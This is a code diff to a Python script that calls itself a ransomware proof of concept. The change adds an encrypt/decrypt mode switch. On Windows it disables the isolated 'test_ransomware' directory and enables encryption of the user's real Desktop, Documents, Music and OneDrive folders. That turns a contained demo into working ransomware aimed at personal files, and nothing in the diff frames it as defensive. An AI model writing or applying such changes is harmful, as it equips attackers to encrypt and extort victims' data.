@@ -78,7 +78,7 @@ def parse_args():
                         
     return parser.parse_args()
 
-def main():
+def main(type):
     #if len(sys.argv) <= 1:
     #    print('[*] Ransomware - PoC\n')
     #    # banner()        
@@ -95,8 +95,12 @@ def main():
     
     # Force one click and comment out args above
     absolute_path = "None"
-    encrypt = True 
-    decrypt = False
+    if type == "encrypt":
+        encrypt = True 
+        decrypt = False
+    elif type == "decrypt":
+        encrypt = False 
+        decrypt = True
     
     if absolute_path != 'None':
         startdirs = [absolute_path]
@@ -106,13 +110,13 @@ def main():
         if plt == "Linux" or plt == "Darwin":
             startdirs = [os.environ['HOME'] + '/test_ransomware']
         elif plt == "Windows":
-            startdirs = [os.environ['USERPROFILE'] + '\\test_ransomware']
+            #startdirs = [os.environ['USERPROFILE'] + '\\test_ransomware']
             # Can also hardcode additional directories
-            # startdirs = [os.environ['USERPROFILE'] + '\\Desktop', 
-                        # os.environ['USERPROFILE'] + '\\Documents',
-                        # os.environ['USERPROFILE'] + '\\Music',
-                        # os.environ['USERPROFILE'] + '\\Desktop',
-                        # os.environ['USERPROFILE'] + '\\Onedrive']
+            startdirs = [os.environ['USERPROFILE'] + '\\Desktop', 
+                        os.environ['USERPROFILE'] + '\\Documents',
+                        os.environ['USERPROFILE'] + '\\Music',
+                        os.environ['USERPROFILE'] + '\\Desktop',
+                        os.environ['USERPROFILE'] + '\\Onedrive']
         else:
             print("Unidentified system")
             exit(0)
